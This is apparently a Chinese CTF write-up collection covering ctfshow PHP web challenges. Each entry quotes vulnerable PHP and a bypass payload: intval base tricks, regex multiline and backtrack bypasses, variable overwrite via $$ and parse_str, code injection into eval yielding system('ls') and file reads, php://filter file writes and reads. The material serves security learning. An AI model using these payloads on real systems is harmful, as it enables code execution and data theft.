<a href="https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine">利用数组绕过小结</a>
```
1. 数组绕过md5判断
2. 数组绕过strcmp
3. 数组绕过ereg(存在%00 截断)
4. php的弱类型+数组绕过正则
```


### <font color="yellow">intval</font>
```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```
利用 intval() base=0  进制绕过
payload
```php
?num=0×117c    //十六进制
?num=010574    //八进制
```
intval取的是我们所输入内容开头的整数
```php
?num=4476a    //字符串
```
#### <font color="yellow">/m 多行匹配绕过</font>

```php
 <?php
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```
分析:
```
/i 表示匹配的时候不区分大小写
/m 表示多行匹配，什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号
```
payload
```php
?cmd=1%0aphp
```

<a href="https://www.php.net/str_pos">strpos()函数</a>
```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```
payload
```php
对于strpos()函数，我们可以利用换行进行绕过（%0a）
payload:?num=%0a010574
也可以小数点绕过
payload：?num=4476.0
因为intval()函数只读取整数部分
还可以八进制绕过(%20是空格的url编码形式)
payload：?num=%20010574
?num= 010574 // 前面加个空格
?num=+010574 
?num=+4476.0
```

<a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">MD5比较漏洞 弱比较、强比较、强碰撞</a></br>
<a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5碰撞的一些例子</a>


<a href="https://www.jb51.net/article/42425.htm">php中OR与|| AND与&&的区别总结</a></br>
<a href="https://www.php.net/manual/zh/class.reflectionclass.php">ReflectionClass 类</a>
```php
 <?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
?>
```
注意点:

```php
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3)
这里是 先将 $v0=is_numeric($v1) 最后再进行 and
```
payload
```php
方法一:
?v1=1&v2=var_dump($ctfshow)&v3=;
方法二:
?v1=1&v2=echo new ReflectionClass&v3=;
```
<a href="https://www.php.net/manual/zh/function.file-put-contents.php">file_put_contents（）函数</a></br>
<a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func（）函数</a></br>
<a href="https://www.php.net/manual/zh/function.substr.php">substr（）函数</a></br>
<a href="https://www.runoob.com/php/func-string-hex2bin.html">hex2bin（）函数</a>

```php
 <?php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
?>
```
分析代码：
```php
v1作为 call_user_func的第一个参数。
v3作为 file_put_contents的文件名。
call_user_func(v1,v1,v1,s);返回结果作为file_put_contents的第二参数
```
payload
```
get 
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php 
post: v1=hex2bin
```
<a href="https://blog.csdn.net/qq_45521281/article/details/105849770">变量覆盖漏洞总结</a>
```
1. extract()变量覆盖
2. $$导致的变量覆盖问题（重点）
3. parse_str()导致的变量覆盖
```

```php
 <?php
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
?>
你还想要flag嘛？
```
payload
```
get
?suces=flag
post
error=suces
```

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;

       }
}
?>
```
分析:
```
parse_str($v1,$v2);
将 $v1,$v2 作为key,对应的值作为 $value
于是本人构造payload:
v1=$value & v3=$value
存在问题!!!
```
payload:
```
v1=v2=flag=md5(v3)
```

#### <font color="yellow">形如 new $v1($v2())</font>
心得:
```
一般是找到对应的php自带类，以及类相关的方法,比如之前的php 反射类
```
```
```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
}
?>
```
payload
```php
?v1=ReflectionClass&v2=system('ls')
?v1=ReflectionClass&v2=system('cat fl36dg.txt')
```
<a href="https://blog.csdn.net/baidu_35085676/article/details/52002579">getcwd()函数的用法</a></br>
<a href="https://blog.csdn.net/chenrenchou1924/article/details/100999849">PHP使用FilesystemIterator迭代器遍历目录</a>
紧接上一题
```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");
}
?>
```
#### <font color="yellow">php超全局变量$GLOBALS的使用</font>
解释:
```
$GLOBALS — 引用全局作用域中可用的全部变量
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
```
例子:
```php
$a=123;
$b=456;
var_dump($GLOBALS);
```
部分输出:
```php
  ["a"]=>
  int(123)
  ["b"]=>
  int(456)
```
```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
?>
```
payload:
```php
?v1=ctfshow&v2=GLOBALS
```

#### <font color="yellow">is_file() </br> filter()</font>
```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```
分析:
```php
is_file()判断$file是文件,highlight_file()高亮文件内容
结合 filter 很容易联想php伪装协议
```
payload:
```
可以直接用不带任何过滤器的filter伪协议
payload:file=php://filter/resource=flag.php
也可以用一些没有过滤掉的编码方式和转换方式
payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
file=compress.zlib://flag.php
payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
```
<a href="https://blog.csdn.net/qq_49480008/article/details/113753951">探索php伪协议以及死亡绕过</a>


#### <font color="yellow">特殊绕过</font>
<a href="https://www.php.net/manual/zh/function.parse-str.
php">assert函数</a>

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```
分析:
```
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g']))

PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_
但是有一个特性可以绕过,使变量名出现.之类的
特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了
如 CTF[SHOW.COM=>CTF_SHOW.COM
```
payload:
```
方法一:
get:
?a=1+fl0g=flag_give_me
post:
CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])

方法二:
get:
?a=1+fl0g=flag_give_me
post:
CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])


方法三:
CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag
```
<a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func函数</a></br>
<a href="https://www.php.net/manual/zh/function.get-defined-vars.php">get_defined_vars函数</a></br>
<a href="https://blog.csdn.net/qq_49480008/article/details/115384498">GetText</a>

```php
 <?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}
function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} NULL 
```
解题思路：
```
var_dump(call_user_func(call_user_func($f1,$f2)));
call_user_func ( callable $callback , mixed $parameter = ? , mixed $... = ? ) : mixed

get_defined_vars — 返回由所有已定义变量所组成的数组 
printf(gettext("My name is %s.\n"), my_name);
等价于
printf(_("My name is %s.\n"), my_name);
```
payload
```
?f1=_&f2=get_defined_vars
```

<a href="https://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯/递归限制（非贪婪模式)</a></br>
<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制（贪婪模式）</a>
```
PHP中，为了防止一次正则匹配调用的匹配过程过大从而造成过多的资源消耗，限定了一次正则匹配中调用匹配函数的次数。 回溯主要有两种
贪婪模式下，pattern部分被匹配，但是后半部分没匹配（匹配“用力过猛”，把后面的部分也匹配过了）时匹配式回退的操作，在出现*、+时容易产生。
非贪婪模式下，字符串部分被匹配，但后半部分没匹配完全（匹配“用力不够”，需要通配符再匹配一定的长度），在出现*?、+?时容易产生。
```

<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南</a>

<a href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a>

<a href="https://blog.csdn.net/qq_49480008/article/details/115872899">$_SERVER[‘QUERY_STRING‘]</a>
<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a>




